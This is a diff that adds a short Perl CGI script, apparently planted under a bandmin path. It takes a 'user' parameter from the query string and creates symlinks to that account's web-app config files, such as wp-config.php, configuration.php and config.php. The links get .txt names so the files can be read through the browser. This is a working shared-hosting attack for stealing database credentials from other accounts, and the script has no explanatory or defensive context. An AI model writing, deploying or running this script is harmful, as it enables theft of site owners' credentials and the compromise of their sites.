@@ -1,0 +1,22 @@
+#!/usr/bin/perl -I/usr/local/bandmin
+print "Content-type: text/html\n\n";
+if (length ($ENV{'QUERY_STRING'}) > 0){
+      $buffer = $ENV{'QUERY_STRING'};
+      @pairs = split(/&/, $buffer);
+      foreach $pair (@pairs){
+           ($name, $value) = split(/=/, $pair);
+           $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+           $in{$name} = $value; 
+      }
+ }
+$user = $in{'user'};
+symlink('/home/'.$user.'/public_html/config.php','hcsy0.txt');
+symlink('/home/'.$user.'/public_html/includes/configure.php','hcsy1.txt');
+symlink('/home/'.$user.'/public_html/inc/config.php','hcsy2.txt');
+symlink('/home/'.$user.'/public_html/config.inc.php','hcsy3.txt');
+symlink('/home/'.$user.'/public_html/Settings.php','hcsy4.txt');
+symlink('/home/'.$user.'/public_html/configuration.php','hcsy5.txt');
+symlink('/home/'.$user.'/public_html/wp-config.php','hcsy6.txt');
+symlink('/home/'.$user.'/public_html/datas/config.php','hcsy7.txt');
+symlink('/home/'.$user.'/public_html/conf_global.php','hcsy8.txt');
+print "cekilen = $user"; 
